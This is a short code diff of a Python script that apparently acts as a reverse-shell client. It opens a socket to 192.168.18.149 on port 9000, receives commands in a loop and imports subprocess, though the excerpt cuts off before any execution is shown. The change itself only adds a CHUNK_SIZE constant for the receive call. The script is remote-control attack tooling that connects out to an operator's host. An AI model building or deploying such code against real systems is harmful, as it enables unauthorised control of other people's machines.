@@ -1,13 +1,15 @@
 import socket
 import os
 import subprocess
+
+CHUNK_SIZE = 1024
 identifier = "<END OF FILE>"
 arp_addresss = ("192.168.18.149",9000)
 # binding to serer ip
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(arp_addresss)
 while True:
-    command = s.recv(1024)
+    command = s.recv(CHUNK_SIZE)
     command = command.decode()
     #for stopping command
     print(command)
